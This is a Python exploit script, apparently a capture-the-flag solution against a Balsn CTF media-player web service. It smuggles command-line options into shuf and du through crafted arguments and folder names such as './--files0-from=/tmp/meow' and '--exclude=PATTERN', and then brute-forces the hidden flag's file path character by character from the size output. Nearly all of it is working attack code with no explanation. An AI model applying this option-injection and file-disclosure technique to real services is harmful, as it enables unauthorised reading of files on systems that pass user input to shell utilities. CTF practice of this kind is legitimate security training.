#!/usr/bin/env python3
import requests
import json
from urllib.parse import urljoin
from base64 import b64decode
session = requests.Session()
options = {
    # 'proxies': {
    #     'http': 'http://1.2.3.4:8080',
    #     'https': 'https://1.2.3.4:8080'
    # },
    'allow_redirects': False
}
base_url = 'http://windows-xp-media-player.balsnctf.com'
# init
session.get(urljoin(base_url, '/'), **options)
uid = json.loads(b64decode(session.cookies['session'].split('.')[0].encode()).decode())['uid']
print(uid)
# call shuf
args = [
    '--help',
    '-z',
    '/flag/',
    '--output',
    '/tmp/meow'
]
session.get(urljoin(base_url, '/q/add'), params={'args':' '.join(args)}, **options)
session.get(urljoin(base_url, '/q/skip'), **options)
session.get(urljoin(base_url, '/q/shuf'), **options)
# create folder "./--files0-from="
params = {
    'op': 'create',
    'args': './--files0-from='
}
session.get(urljoin(base_url, '/'), params=params, **options)
# create folder "./--files0-from=/tmp"
params = {
    'op': 'create',
    'args': './--files0-from=/tmp'
}
session.get(urljoin(base_url, '/'), params=params, **options)
# create folder "./--files0-from=/tmp/meow"
params = {
    'op': 'create',
    'args': './--files0-from=/tmp/meow'
}
session.get(urljoin(base_url, '/'), params=params, **options)

flag_path = ''

for j in range(2):
    if j == 1:
        flag_path += '?'
    for i in range(32):
        for c in '1234567890abcdef':
            print(f'\rtrying {c}', end='')
            # create file "./--exclude=[PATTERN]"
            session.get(urljoin(base_url, '/q/skip'), **options)
            session.get(urljoin(base_url, '/q/skip'), **options)
            session.get(urljoin(base_url, '/q/skip'), **options)
            session.get(urljoin(base_url, '/q/skip'), **options)
            args = [
                '--help',
                '--output',
                f'/sandbox/{uid}/--exclude={flag_path}{c}*'
            ]
            session.get(urljoin(base_url, '/q/add'), params={'args':' '.join(args)}, **options)
            session.get(urljoin(base_url, '/q/skip'), **options)
            session.get(urljoin(base_url, '/q/shuf'), **options)
            # call du
            args = [
                '--files0-from=/tmp/meow',
                f'--exclude={flag_path}{c}*'
            ]
            params = {
                'op': 'stat',
                'args': ' '.join(args)
            }
            response = session.get(urljoin(base_url, '/'), params=params, **options)
            if '16K' not in response.text:
                flag_path += c
                print('\nFlag_path:', flag_path)
                break